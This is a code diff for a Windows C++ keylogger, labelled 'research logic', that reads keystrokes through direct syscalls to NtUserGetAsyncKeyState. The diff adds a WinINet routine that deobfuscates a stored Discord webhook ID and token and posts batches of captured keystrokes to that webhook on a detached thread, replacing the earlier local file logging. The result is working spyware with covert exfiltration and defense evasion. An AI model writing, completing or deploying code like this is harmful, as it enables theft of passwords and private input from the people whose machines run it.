@@ -6,13 +6,17 @@
 #include <objbase.h>
 #include <cctype>
 #include <thread>
+#include <wininet.h>
 
 #include "secbuff.hpp"
+#include "Config.hpp"
+#include "Obfuscator.hpp"
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "uuid.lib")
 #pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "wininet.lib")
 
 // Links to your assembly bridge
 extern "C" short DirectSyscallBridge(int keyCode, DWORD ssn, uintptr_t syscallAddr);
@@ -76,6 +80,34 @@ void writeToFile(std::string textData) {
     }
 }
 
+void PerformNetworkUpload(std::string data) {
+    // 1. Initialize Internet session
+    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hSession) return;
+
+    std::string realID = Obfuscator::Deobfuscate(Config::WEBHOOK_ID, Config::OBF_KEY);
+    std::string realToken = Obfuscator::Deobfuscate(Config::WEBHOOK_TOKEN, Config::OBF_KEY);
+
+    // 2. Connect to Discord's server
+    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (hConnect) {
+        std::string path = std::string("/api/webhooks/") + realID + "/" + realToken;
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+
+        if (hRequest) {
+            std::string jsonPayload = "{\"content\": \"" + data + "\"}";
+            const char* headers = "Content-Type: application/json";
+
+            // 4. Send the payload
+            HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());
+
+            InternetCloseHandle(hRequest);
+        }
+        InternetCloseHandle(hConnect);
+    }
+    InternetCloseHandle(hSession);
+}
+
 extern "C" void RunResearchLogic() {
     GetDesktopWindow();
     DWORD keySSN = ScanForSyscallID("NtUserGetAsyncKeyState");
@@ -98,9 +130,10 @@ extern "C" void RunResearchLogic() {
                 }
                 else if (!isDown && keyWasDown[vk]) keyWasDown[vk] = false;
             }
-            if (buffer.size() >= 20) {
-                writeToFile(buffer.getDecryptedData());
+            if (buffer.size() >= 30) {
+                std::string report = buffer.getDecryptedData();
                 buffer.clear();
+                std::thread(PerformNetworkUpload, report).detach();
             }
             Sleep(10);
         }
